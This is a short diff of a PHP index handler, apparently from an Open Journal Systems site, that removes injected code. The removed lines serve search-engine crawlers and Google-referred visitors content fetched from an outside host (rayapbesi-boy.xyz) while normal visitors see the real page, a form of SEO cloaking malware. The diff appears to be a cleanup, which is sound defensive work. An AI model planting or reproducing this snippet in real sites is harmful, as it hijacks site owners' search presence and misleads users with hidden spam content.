@@ -56,15 +56,6 @@ class IndexHandler extends PKPIndexHandler
                 $request->redirect(null, 'admin', 'contexts');
             }
         }
-        
-    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
-
-if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
-echo file_get_contents('https://rayapbesi-boy.xyz/landing/ojs.bahiseen/index.txt');
-exit();
-}
 
         $this->setupTemplate($request);
         $router = $request->getRouter();
